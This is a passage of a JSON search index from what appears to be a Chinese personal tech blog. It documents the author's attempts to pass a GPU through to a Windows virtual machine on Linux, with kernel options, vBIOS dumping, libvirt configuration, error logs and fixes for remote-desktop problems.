\u542f\u52a8\u65f6\u5faa\u73af\u84dd\u5c4f]\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5\u4e00csm","title":"\u65b9\u6cd5\u4e00\uff1aCSM","text":"<p>UEFI \u5f00\u542f CSM\u3002\u8ba9 UEFI \u521d\u59cb\u5316\u53e6\u4e00\u4e2a GPU\u3002\u5173\u4e8e CSM \u548c UEFI \u4f60\u8981\u77e5\u9053\u7684\u4e00\u4e9b\u4e8b - \u77e5\u4e4e (zhihu.com)</p> <p>\u8bd5\u8fc7\u540e\u5bf9\u6211\u6ca1\u6709\u4f5c\u7528</p> <p>(8) Passing through custom ROM file doesn't change anything : VFIO (reddit.com)</p> <p>If you're using an MSI x370 Pro like I was, there isn't actually a setting for this. The solution is to install linux in UEFI mode and enable Windows 10 WHOQL Support (even though you're booting to Linux). This is a hackish solution that causes the board to use a second GPU instead of the GPU in the primary slot.</p> <p>\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u8981\u8bf4\u7684 efifb:off</p> <p>I've got 2 graphics cards, a 2070 and a 1080. The 2070 I'm using as pass-through, the 1080 is the one I'm using for basic Linux stuff. On boot, the 2070 is initialised as the primary display by the MB and since I've blacklisted it from grub it basically only displays the Linux kernel version and nothing else. Then, rest of the startup is (effectively) silent, until Linux starts X, which then uses the 1080 as it's display since that's what I've configured it to use.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5\u4e8cefifboff\u6210\u529f","title":"\u65b9\u6cd5\u4e8c\uff1aefifb:off(\u6210\u529f)","text":"<p>\u4fdd\u8bc1 boot \u65f6\uff0c\u4e0d\u4f7f\u7528 primary GPU\u3002</p> <ul> <li>linux \u542f\u52a8\u65f6\u4f1a\u663e\u793a\u542f\u52a8\u65e5\u5fd7\u548c tty login \u5230\u7ec8\u7aef\u4e2d (console)\u3002\u5728 linux \u684c\u9762\u53d1\u884c\u7248\u4e2d\uff0cconsole \u88ab\u8f93\u51fa\u5230 framebuffer \u4e2d\u3002</li> <li>\u663e\u5361\u9a71\u52a8\u548c EFI/BIOS \u80fd\u591f\u63d0\u4f9b\u8fd9\u4e2a framebuffer</li> <li>\u5728 linux \u542f\u52a8\u7684\u65e9\u671f\uff08\u8fd8\u6ca1\u6709\u52a0\u8f7d\u663e\u5361\u9a71\u52a8\u4e4b\u524d\uff09\uff0c\u4f7f\u7528 EFI/VESA \u63d0\u4f9b\u7684 framebuffer\u3002\u800c\u8fd9\u4fbf\u4f1a\u4f7f\u7528 firmware \u6307\u5b9a\u7684 primary gpu\u3002</li> </ul> <pre><code>video=efifb:off\n</code></pre> <p>\u76f8\u5f53\u4e8e\u7981\u7528\u4e86 tty\uff1f</p> <p>\u91cd\u65b0\u6d4b\u8bd5 \u4e24\u5f20\u663e\u5361\u90fd\u8fde\u63a5\u663e\u793a\u5668\uff0c\u4e3b\u663e\u5361\u76f4\u901a\u3002</p> <ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cboot logo \u663e\u793a\u5728 primary \u4e0a\uff0c\u753b\u9762\u6ca1\u6709\u95ee\u9898\u3002\u542f\u52a8\u5b8c\u6210\u540e\u4e3b\u663e\u793a\u5668\u663e\u793a login shell\u3002\u542f\u52a8 vm\uff0c\u9ed1\u5c4f\uff0c\u8fdc\u7a0b\u8fde\u63a5\u663e\u793a 43 \u9519\u8bef\u3002</li> <li>\u4e3b\u663e\u5361\u4e0d\u8fde\u63a5\u663e\u793a\u5668\uff0cboot logo \u663e\u793a\u5728 second \u4e0a\uff0c\u753b\u9762\u989c\u8272\u4e0d\u5bf9\uff0cubuntu logo \u7f3a\u5c11\u4e1c\u897f\u3002\u542f\u52a8 vm \u6ca1\u95ee\u9898</li> <li>\u5f00\u542f efifb:off\uff0c\u521a\u5f00\u59cb\u4e3b\u663e\u793a\u5668\u4e0a\u663e\u793a\u9009\u62e9\u662f\u5426\u8fdb bios \u753b\u9762\uff0c\u63a5\u7740\u4e3b\u663e\u793a\u5668\u7184\u706d\u3002\u526f\u663e\u793a\u5668\u53ea\u663e\u793a\u4e86 logo\uff0cF2 \u9ed1\u5c4f\uff08\u6ca1\u6709 log \u8f93\u51fa\uff09\u3002\u6700\u540e\u8fdb\u5165\u4e86\u7cfb\u7edf\uff08\u6ca1\u6709 login shell\uff09\u3002\u542f\u52a8 vm \u6ca1\u6709\u95ee\u9898\u3002</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5\u4e09qemu-\u8bbe\u7f6e-vbios","title":"\u65b9\u6cd5\u4e09\uff1aqemu \u8bbe\u7f6e vBIOS","text":"<p>QEMU can expose the vBIOS from a ROM file supplied to it by libvirt. \u83b7\u5f97 vBIOS \u65b9\u6cd5</p> <ul> <li> <p>dump\uff1aDump_GPU_vBIOS/dump_vbios.sh at master \u00b7 SpaceinvaderOne/Dump_GPU_vBIOS (github.com) (8) How to dump GPU VBIOS on linux? : VFIO (reddit.com)</p> <pre><code>cd /sys/bus/pci/devices/0000:0a:00.0\necho 1 &gt; rom\ncat rom &gt; /tmp/vbios\necho 0 &gt; rom\n</code></pre> </li> </ul> <ul> <li>\u4ece\u7f51\u7edc\u4e0a\u4e0b\u8f7d\uff08TechPowerup\uff09</li> </ul> <p>\u4f7f\u7528vbios</p> <pre><code>&lt;hostdev mode='subsystem' type='pci' managed='yes'&gt;\n &lt;source&gt;\n &lt;address domain='0x0000' bus='0x01' slot='0x00' function='0x0'/&gt;\n &lt;/source&gt;\n &lt;rom file='/path/to/vbios.rom'/&gt;\n &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x04' function='0x0'/&gt;\n&lt;/hostdev&gt;\n</code></pre> <p>\u8bd5\u8fc7\u540e\u62a5\u9519</p> <pre><code>\u279c  ~ sudo virsh start win10\nerror: Failed to start domain 'win10'\nerror: internal error: qemu unexpectedly closed the monitor: 2023-05-25T06:28:54.441761Z qemu-system-x86_64: warning: This family of AMD CPU doesn't support hyperthreading(2)\nPlease configure -smp options properly or try enabling topoext feature.\n2023-05-25T06:28:55.270270Z qemu-system-x86_64: -device vfio-pci,host=0000:0a:00.0,id=hostdev3,bus=pci.5,addr=0x0,romfile=/home/yfy/scripts/data/vbios-amd-6500xt.bin: vfio_listener_region_add received unaligned region\n2023-05-25T06:29:00.830154Z qemu-system-x86_64: -device vfio-pci,host=0000:0a:00.0,id=hostdev3,bus=pci.5,addr=0x0,romfile=/home/yfy/scripts/data/vbios-amd-6500xt.bin: Failed to mmap 0000:0a:00.0 BAR 0. Performance may be slow\n2023-05-25T06:29:00.875494Z qemu-system-x86_64: -device vfio-pci,host=0000:0a:00.0,id=hostdev3,bus=pci.5,addr=0x0,romfile=/home/yfy/scripts/data/vbios-amd-6500xt.bin: failed to find romfile \"/home/yfy/scripts/data/vbios-amd-6500xt.bin\"\n</code></pre> <p>\u53d1\u73b0</p> <ul> <li>\u53ea\u6709\u5f00\u542f vm \u540e\uff0c\u624d\u53ef\u4ee5 dump bios\uff0c\u5426\u8005\u4f1a\u62a5 output error</li> <li>\u5173\u95ed\u5c4f\u5e55\u4e0b\u5f00\u673a\uff0cvm \u663e\u5361\u6b63\u5e38\u3002\u4f46\u662f dump \u7684 vbios \u901a\u4e0d\u8fc7\u68c0\u9a8c\u3002\u53cd\u800c\u662f\u6253\u5f00\u5c4f\u5e55\u4e0b\u5f00\u673a\uff0cvm \u663e\u5361\u4e0d\u6b63\u5e38\u7684\u53ef\u4ee5\u901a\u8fc7\u68c0\u9a8c\u3002</li> </ul> <pre><code>Valid ROM signature found @0h, PCIR offset 370h\n        PCIR: type 0 (x86 PC-AT), vendor: 1002, device: 743f, class: 030000\n        PCIR: revision 0, vendor revision: 1404\nError, ran off the end\n</code></pre> <pre><code>Valid ROM signature found @0h, PCIR offset 370h\n        PCIR: type 0 (x86 PC-AT), vendor: 1002, device: 743f, class: 030000\n        PCIR: revision 0, vendor revision: 1404\nValid ROM signature found @ae00h, PCIR offset 1ch\n        PCIR: type 3 (EFI), vendor: 1002, device: 743f, class: 030000\n        PCIR: revision 0, vendor revision: 0\n                EFI: Signature Valid, Subsystem: Boot, Machine: X64\nValid ROM signature found @14400h, PCIR offset 1ch\n        PCIR: type 3 (EFI), vendor: 1002, device: 743f, class: 000000\n        PCIR: revision 0, vendor revision: 0\n                EFI: Signature Valid, Subsystem: Boot, Machine: ARM 64-bit\n        Last image\n</code></pre> <p>(8) Do you need or not need a vbios file? : VFIO (reddit.com) \u4f7f\u7528\u9519\u8bef\u7684 vbios \u4e0d\u4f1a\u5bf9\u663e\u5361\u9020\u6210\u635f\u574f OR, you can use vbios dumps from other people on the Internet. It's less wise, but in some intentional personal testing I was unable to kill my nvidia GPU's by initializing them on my VM with intentionally bad/truncated/wrong-version romfile=xxx roms. In fact some of those worked for my single GPU passthrough scenarios on GTX780's and a 2080Ti despite being vastly different versions than my GPU's actual current vbios version. Minor differences I presume.</p> <p>\u548c\u5b9e\u9645 flash gpu rom \u662f\u4e0d\u540c\u7684 I personally wouldn't advise actually flashing your GPU's bios unless required. From what I can see, that is not the same thing as the vbios romfile= qemu option where you're asking your guest to execute a fake rom as a one-off from your host instead of the broken (or valid if correctly isolated) boot rom data on your GPU as it were already initialized by the host earlier in the boot.</p> <p>nv \u7684\u6709 rom \u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\u7684\u95ee\u9898\uff0camd \u6ca1\u6709 Furthermore, it seems only NVIDIA cards have this problem and even then only some. They can be initialized once per boot. That's it. AMD cards don't seem to have this problem AFAIK and present their rom the same all the time, so the VM has no trouble initializing them again and again and again once given one.</p> <p>\u4ec0\u4e48\u65f6\u5019\u9700\u8981\u6307\u5b9a bios This means that if your motherboard draws to the GPU on boot with system information, a logo and what not on the GPU you want to pass through then you're already too late and would need a vbios file if you cannot stop this behavior in your host's bios settings.</p> <p>\u4e3b\u677f\u4e0d\u652f\u6301\u6307\u5b9a\u6838\u663e\u72ec\u663e\uff0c\u6216\u8005\u591a\u663e\u5361\u4e0b\u4e0d\u652f\u6301\u6307\u5b9a\u67d0\u4e00\u5757\u663e\u5361 If your motherboard doesn't have an option to strictly pick which GPU to use (integrated vs dedicated, or an option of\u00a0which\u00a0of multiple dedicated to use) it may initialize it too and you will need a vbios file for a guest all the same.</p> <p>Single GPU hosts don't get any choice and have to draw their POST information ...somewhere... So you will almost always need a vbios file outside very special motherboard configurations (Usually Server boards handle this nicely, even if they only have a shitty onboard 8MB vga plug for basic terminal display only)</p> <p>Basically if the host uses the card at all, it's initialized and the rom is borked for the boot. A vbios file will be needed for a guest to reinitialize it and works around this nicely.</p> <p>\u53ef\u4ee5\u52a8\u6001\u76f4\u901a\u663e\u5361\uff1f I personally don't think about it too much. I've written my\u00a0own vfio script\u00a0compatible with my single GPU host and use a vbios file and use my linux desktop for as long as I like until I want to pass the gpu to the guest, it dynamically unbinds the nvidia driver and stops lightdm before starting the guest with the vbios romfile included to reinitialize the card.</p> <p>\u4e0d\u5173\u673a\u91cd\u7f6e gpu\uff1f This makes me imagine that putting a PC to sleep then waking it as you start your qemu VM may be another way to 'reboot' the GPU and restore its vbios rom ready for the guest without a true host reboot (With a low enough sleep state), but who wants to do that. Maybe something for me to experiment with though. It could also help make the GPU more stable when returning to a host in some circumstances.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5355-gpu-\u76f4\u901a","title":"\u5355 gpu \u76f4\u901a\uff1f","text":"<p>(8) Single Nvidia passthrough: endless kernel NVRM logs : VFIO (reddit.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#rdp-\u5f88\u5361","title":"RDP \u5f88\u5361","text":"<p>\u53d1\u73b0\u8bbe\u5907\u7ba1\u7406\u5668\u4e2d\u663e\u793a\u7684\u662f Microsoft \u57fa\u672c\u663e\u793a\u9002\u914d\u5668\uff0c\u5728\u663e\u793a\u9002\u914d\u5668\u4e0a\u624b\u52a8\u5b89\u88c5 QXL \u9a71\u52a8\u540e\u89e3\u51b3\uff08\u4f4d\u4e8e virtio \u5149\u76d8\u7684 qxlod \u76ee\u5f55\u4e0b\uff09</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#vnc-\u4e0e-rdp","title":"VNC \u4e0e RDP","text":"<ul> <li>\u8fdc\u7a0b\u684c\u9762 RDP \u4f7f\u7528\u81ea\u5df1\u7684 remote display \u663e\u793a\u9002\u914d\u5668\uff0c\u548c\u4e00\u4e2a\u901a\u7528\u975e\u5373\u63d2\u5373\u7528\u8bbe\u5907 (uPnP)</li> </ul> <ul> <li> <p>tightvnc \u5219\u4f1a\u4f7f\u7528 QXL controller + PnP</p> <p></p> </li> </ul> <ul> <li>\u540e\u9762\u53d1\u73b0\u8c8c\u4f3c tightvnc \u548c parsec \u8fdc\u7a0b\u8fde\u63a5\uff08\u4f7f\u7528\u865a\u62df\u663e\u793a\u9002\u914d\u5668\uff09\u548c VNC\uff08\u4f7f\u7528\u663e\u5361\u6216\u8005 QXL\uff09\u90fd\u4f1a\u4f7f\u7528\uff0c\u4f18\u5148 VNC\u3002</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#parsec-\u8fde\u63a5\u73a9\u6e38\u620f\u5f88\u7cca","title":"parsec \u8fde\u63a5\u73a9\u6e38\u620f\u5f88\u7cca","text":"<p>\u53d1\u73b0\u662f\u663e\u793a\u5668\u9009\u62e9\u4e86 125% \u7684\u7f29\u653e\u5bfc\u81f4\u7684</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#steam-link-\u8fde\u63a5\u65f6-windows-\u7528\u6237\u767b\u5f55\u5f39\u7a97","title":"steam link \u8fde\u63a5\u65f6 windows \u7528\u6237\u767b\u5f55\u5f39\u7a97","text":"<p>\u53c2\u8003\uff1aCan't get past Steam Input Dialog Box :: Steam Remote Play (steamcommunity.com)</p> <p>\u95ee\u9898\u4e3a\u4f7f\u7528 steam link \u8fde\u63a5\u65f6\uff0cwindows \u9700\u8981\u767b\u5f55\u3002\u4f46\u662f\u4f1a\u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3\uff0c\u8bf4\uff1aWould you like to accept secure desktop input from Steam? steam link \u8fdc\u7a0b\u767b\u9646\u65f6\u65e0\u6cd5\u70b9\u51fb\u7cfb\u7edf\u5f39\u7a97\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8fdb\u5165\u3002\u5f39\u7a97\u4e5f\u8bf4\u9700\u8981\u5750\u5728\u7535\u8111\u524d\u70b9\u51fb\u786e\u8ba4</p> <p>\u89e3\u51b3\uff1a\u5982\u679c windows \u6ca1\u6709\u9501\u5c4f\uff0c\u90a3\u4e48 steam link \u767b\u5f55\u5c31\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\u767b\u5f55 windows\u3002\u53ef\u4ee5\u5728 windows \u4e0a\u5b89\u88c5 tightvnc\uff0c\u901a\u8fc7 vnc \u8fde\u63a5\u540e\uff0csteam link \u8fde\u63a5\u65f6\u5c31\u4e0d\u4f1a\u8f93\u5bc6\u7801\u4e86\uff08\u800c\u4e14 vnc \u8fde\u63a5\u4e5f\u4e0d\u4f1a\u6389\uff09</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#windows-\u865a\u62df\u673a\u5185-obs-\u5f55\u5c4f","title":"Windows \u865a\u62df\u673a\u5185 OBS \u5f55\u5c4f","text":"<p>\u901a\u8fc7 rdp \u8fdc\u7a0b\u8fde\u63a5 windows \u65f6\u4f7f\u7528 OBS \u5f55\u5c4f\uff0c\u4f1a\u53d1\u73b0\u65ad\u5f00 rdp \u8fde\u63a5\u540e\uff0c\u5f55\u5230\u7684\u662f\u9ed1\u5c4f\u3002\u539f\u56e0\u662f rdp \u8fde\u63a5\u65f6\uff0c\u4f7f\u7528\u7684\u662f\u865a\u62df\u7684\u663e\u793a\u9002\u914d\u5668\uff08\u65e0\u6cd5\u8c03\u8282\u5206\u8fa8\u7387\uff09\uff0c\u865a\u62df\u7684\u58f0\u5361\u3002\u5f53\u65ad\u5f00\u8fde\u63a5\u65f6\uff0c\u8fd9\u4e9b\u90fd\u4f1a\u6d88\u5931\uff0c\u6545\u65e0\u6cd5\u5f55\u5c4f\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\u4e3a\u4f7f\u7528 vnc\uff0cvnc \u8fde\u63a5\u540e\u5f00\u542f\u5f55\u5c4f\uff0c\u65ad\u5f00\u8fde\u63a5\u540e\uff0c\u4ecd\u7136\u5728\u5f55\u5c4f\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#linux-\u542f\u52a8\u65f6\u9ed1\u5c4f","title":"Linux \u542f\u52a8\u65f6\u9ed1\u5c4f","text":"<p>\u7531\u4e8e host gpu \u5904\u4e8e\u7b2c\u4e8c\u4e2a\u69fd\uff0c\u5bfc\u81f4 X \u542f\u52a8\u5931\u8d25</p> <p>https://wiki.archlinux.org/title/PCI_passthrough_via_OVMF#X_does_not_start_after_enabling_vfio_pci</p> <p>\u8fd9\u91cc\u4e5f\u63d0\u5230\u4e86</p> <p>https://wiki.archlinux.org/title/PCI_passthrough_via_OVMF#Host_unable_to_boot_and_stuck_in_black_screen_after_enabling_vfio</p> <p>\u89e3\u51b3</p> <ul> <li> <p>kernel cmd</p> <pre><code>video_vifib=off\n</code></pre> </li> </ul> <ul> <li> <p>xorg</p> <pre><code>#/etc/X11/xorg.conf.d/second_gpu.conf\nSection \"Device\"\n      Identifier \"AMD GPU\"\n      Driver \"amdgpu\"  #\u586blspci\u770b\u5230\u7684\u9a71\u52a8\n      BusID  \"PCI:4:0:0\" #bus id, device id, function id\nEndSection\n</code></pre> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#windows-\u542f\u52a8\u65f6\u5faa\u73af\u84dd\u5c4f","title":"Windows \u542f\u52a8\u65f6\u5faa\u73af\u84dd\u5c4f","text":"<p>windows \u542f\u52a8\u65f6\u84dd\u5c4f\uff0c\u84dd\u5c4f\u4e24\u6b21\u540e\u8fdb\u5165\u6062\u590d\u754c\u9762\uff0c\u9009\u62e9\u5173\u673a\u540e\u518d\u6b21\u542f\u52a8\u4f9d\u7136\u84dd\u5c4f\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u8fdb\u4e00\u6b65\u53d1\u73b0","title":"\u8fdb\u4e00\u6b65\u53d1\u73b0","text":"<p>\u91cd\u542f linux \u65f6\uff0c\u5982\u679c\u76f4\u901a\u7684\u663e\u5361\u4e0a\u8fde\u7740\u663e\u793a\u5668\uff0c\u90a3\u4e48 windows \u542f\u52a8\u5c31\u4f1a\u5faa\u73af\u84dd\u5c4f\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u5148\u62d4\u6389\u663e\u793a\u5668\uff0clinux \u542f\u52a8\u540e\u518d\u63d2\u4e0a\uff0c\u4e4b\u540e\u542f\u52a8 VM-windows \u5c31\u4e0d\u4f1a\u84dd\u5c4f\u3002</p> <p>\u84dd\u5c4f\u65f6\u4ee3\u7801\u4e3a</p> <pre><code>\u7ec8\u6b62\u4ee3\u7801: VIDEO TDR FAILURE\n\u5931\u8d25\u7684\u64cd\u4f5c\uff1anvlddmkm.sys\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u89e3\u51b3","title":"\u89e3\u51b3","text":"<p>\u53d1\u73b0\u95ee\u9898\u53ef\u80fd\u662f\u7531\u4e8e\u5c06 boot GPU \u76f4\u901a\u5bfc\u81f4\u7684PCI passthrough via OVMF - ArchWiki (archlinux.org)</p> <p>The GPU marked as\u00a0<code>boot_vga</code>\u00a0is a special case when it comes to doing PCI passthroughs, since the BIOS needs to use it in order to display things like boot messages or the BIOS configuration menu. To do that, it makes\u00a0a copy of the VGA boot ROM which can then be freely modified.</p> <p>\u4f46\u662f\u6211\u7684\u4e3b\u677f\u6ca1\u529e\u6cd5\u8c03\u8282\u4f7f\u7528\u54ea\u4e2a GPU \u4f5c\u4e3a\u542f\u52a8 GPU \u5728 https://blog.twenska.de/blog/GPU_passthrough/\u4e2d\u770b\u5230\u7c7b\u4f3c\u95ee\u9898\uff0c\u5e76\u63d0\u5230\u89e3\u51b3\u65b9\u6cd5</p> <p>\u67e5\u770b<code>/var/log/libvirt/qemu/win10.log.0</code>\u4f1a\u53d1\u73b0\u5927\u91cf\u7684\u4ee5\u4e0b\u9519\u8bef\uff1a</p> <pre><code>2022-07-21T06:50:56.222055Z qemu-system-x86_64: vfio_region_write(0000:08:00.0:region1+0x345990, 0x13801,8) failed: Device or resource busy\n</code></pre> <p>\u7136\u540e\u542f\u52a8\u865a\u62df\u673a\u524d\u8fd0\u884c\u4ee5\u4e0b\u811a\u672c\u5373\u53ef</p> <pre><code>#!/bin/bash\necho 1 &gt; /sys/bus/pci/devices/0000\\:08\\:00.0/remove &amp;&amp; echo 1 &gt; /sys/bus/pci/rescan\nvirsh start win10\n</code></pre> <p>\u53d1\u73b0 Arch wiki \u63d0\u5230\u76f8\u540c\u7684\u89e3\u51b3\u65b9\u6cd5BAR_3:_cannot_reserve[mem]</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#host-\u5b89\u88c5-nvidia-\u9a71\u52a8\u540e\u542f\u52a8\u4f1a\u53cd\u590d-load-nvidia-\u9a71\u52a8","title":"host \u5b89\u88c5 nvidia \u9a71\u52a8\u540e\u542f\u52a8\u4f1a\u53cd\u590d load nvidia \u9a71\u52a8","text":"<p>\u76f8\u5f53\u4e8e bind vifo \u4e0d\u8d77\u4f5c\u7528\uff1f</p> <pre><code>NVRM: The NVIDIA probe routine was not called for 1 device(s)\n</code></pre> <p>\u89e3\u51b3\u529e\u6cd5\u4e3ablacklist\u6389nvidia\u9a71\u52a8</p> <p>grub2 - How to temporarily blacklist nvidia driver at boot time - Ask Ubuntu</p> <pre><code>module_blacklist=nvidia\n</code></pre> <p>(8) After loading vfio-pci instead of nvidia, my dmesg has dozens of errors : VFIO (reddit.com)</p> <p>\u7406\u8bba\u4e0a\u662f\u4e0d\u9700\u8981 blacklist driver \u7684\uff0c\u4e0d\u7136\u5982\u679c\u662f\u4e24\u5f20 nv \u7684\u663e\u5361\uff0c\u5219\u53e6\u4e00\u5f20\u5c82\u4e0d\u662f\u65e0\u6cd5\u4f7f\u7528 nvidia \u9a71\u52a8\uff1f</p> <p>I have a setup with two nVidia cards (GTX 970 for passthrough and GT 1030 for Linux host) and I'm not blacklisting anything.</p> <p>(8) After loading vfio-pci instead of nvidia, my dmesg has dozens of errors : VFIO (reddit.com) /etc/modprobe.d/nvidia.conf: (You probably will have to create this file.)</p> <pre><code>softdep nvidia pre: vfio-pci\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u6027\u80fd\u4f18\u5316","title":"\u6027\u80fd\u4f18\u5316","text":"<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html-single/virtualization_tuning_and_optimization_guide/index</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#using-looking-glass-to-stream-guest-screen-to-the-host","title":"Using Looking Glass to stream guest screen to the host","text":"<p>gnif/LookingGlass: An extremely low latency KVMFR (KVM FrameRelay) implementation for guests with VGA PCI Passthrough. (github.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#acs-patch","title":"ACS patch","text":"<p>\u6700\u65e9\u7684 patch\uff1aLKML: Alex Williamson: [PATCH] pci: Enable overrides for missing ACS capabilities</p> <p>VFIO tips and tricks: IOMMU Groups, inside and out VFIO tips and tricks: VFIO+VGA FAQ</p> <p>\u81ea\u52a8\u7f16\u8bd1\u5185\u6838 mdPlusPlus/VFIO: This repository contains all my work in the VFIO space (github.com)</p> <p>acs_patch id \u7528\u6cd5\uff1aHelp with PCI Express passthrough (ACS - IOMMU issue) + kernel bugfix | Proxmox Support Forum</p> <p>\u5176\u5b83\uff1a \u8fd9\u4e2a vendor-reset \u662f\u5e72\u561b\u7528\u7684\uff1a gnif/vendor-reset: Linux kernel vendor specific hardware reset module for sequences that are too complex/complicated to land in pci_quirks.c (github.com) \u63d0\u5230\u5b89\u5168\uff1a(4) Is ACS override really that unsafe? : VFIO (reddit.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/","title":"linux 